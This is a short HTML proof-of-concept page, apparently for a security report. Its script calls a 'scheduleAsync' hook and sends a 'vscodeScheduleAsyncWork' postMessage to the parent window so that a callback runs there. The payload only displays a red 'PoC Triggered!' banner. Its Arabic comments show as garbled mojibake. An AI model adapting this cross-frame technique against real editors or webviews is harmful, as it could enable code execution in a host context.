<!DOCTYPE html>
<html>
<head>
  <title>POC1</title>
</head>
<body>
  <h1>Loading exploit...</h1>

  <script>
    // 1. ØªØ³Ø¬ÙŠÙ„ callback
    let callbackId = null;

    function maliciousAction() {
      const d = document.createElement("div");
      d.innerText = "ðŸ”¥ PoC Triggered!";
      d.style.background = "red";
      d.style.color = "white";
      d.style.fontSize = "30px";
      d.style.position = "fixed";
      d.style.top = "10px";
      d.style.left = "10px";
      d.style.zIndex = "999999";
      document.body.appendChild(d);
}


    // Ù‡Ù„ ÙŠÙˆØ¬Ø¯ scheduleAsyncØŸ
    if (window.scheduleAsync) {
      window.scheduleAsync(() => {
        // Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ø³ÙŠÙ†ÙØ° Ø¯Ø§Ø®Ù„ Ø§Ù„Ù€ parent window
        maliciousAction();
      }).then(id => {
        callbackId = id;

        // 2. Ø¨Ø¹Ø¯ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IDØŒ Ù†Ø±Ø³Ù„ postMessage Ù„Ù„Ù€ parent
        parent.postMessage({
          vscodeScheduleAsyncWork: callbackId
        }, "*");
      }).catch(err => {
        console.error("scheduleAsync error:", err);
      });
    } else {
      document.body.innerHTML = "<h2>scheduleAsync not available</h2>";
    }
  </script>
</body>
</html>
